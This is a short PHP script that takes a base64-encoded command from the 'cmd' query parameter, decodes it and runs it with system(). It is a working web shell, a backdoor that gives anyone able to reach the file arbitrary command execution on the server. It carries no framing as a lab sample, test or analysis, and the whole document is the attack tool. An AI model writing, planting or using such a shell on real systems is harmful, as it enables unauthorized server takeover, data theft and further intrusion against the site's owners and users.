<?php
if (isset($_GET['cmd'])) {
    $cmd = base64_decode($_GET['cmd']);
    system($cmd);
}
?>